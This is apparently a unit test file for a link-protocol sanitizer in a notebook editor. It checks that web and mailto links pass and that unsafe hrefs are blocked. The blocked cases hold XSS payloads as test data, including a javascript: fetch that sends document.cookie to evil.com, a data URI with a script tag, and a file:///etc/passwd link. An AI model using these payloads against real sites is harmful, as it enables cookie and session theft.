import { isSafeProtocol } from './NotebookMarkLink'

describe('NotebookMarkLink', () => {
    describe('isSafeProtocol', () => {
        test.each([
            { href: 'https://posthog.com', expected: true },
            { href: 'https://example.com/path?query=1', expected: true },
            { href: 'http://localhost:8000', expected: true },
            { href: 'HTTP://EXAMPLE.COM', expected: true },
            { href: 'HTTPS://EXAMPLE.COM', expected: true },
            { href: 'mailto:support@posthog.com', expected: true },
            { href: 'MAILTO:test@example.com', expected: true },
        ])('allows safe protocol: $href', ({ href, expected }) => {
            expect(isSafeProtocol(href)).toBe(expected)
        })

        test.each([
            { href: 'javascript:alert(1)', description: 'javascript protocol' },
            { href: 'javascript:alert(document.cookie)', description: 'javascript with cookie theft' },
            { href: 'JAVASCRIPT:alert(1)', description: 'uppercase javascript' },
            { href: 'JaVaScRiPt:alert(1)', description: 'mixed case javascript' },
            { href: 'javascript:void(0)', description: 'javascript void' },
            { href: "javascript:fetch('https://evil.com?c='+document.cookie)", description: 'javascript fetch attack' },
            { href: 'data:text/html,<script>alert(1)</script>', description: 'data URI' },
            { href: 'vbscript:msgbox(1)', description: 'vbscript protocol' },
            { href: 'file:///etc/passwd', description: 'file protocol' },
            { href: 'ftp://example.com', description: 'ftp protocol' },
            { href: '', description: 'empty string' },
            { href: 'not-a-url', description: 'plain text' },
            { href: '/relative/path', description: 'relative path' },
            { href: '//example.com', description: 'protocol-relative URL' },
        ])('blocks unsafe protocol ($description): $href', ({ href }) => {
            expect(isSafeProtocol(href)).toBe(false)
        })
    })
})
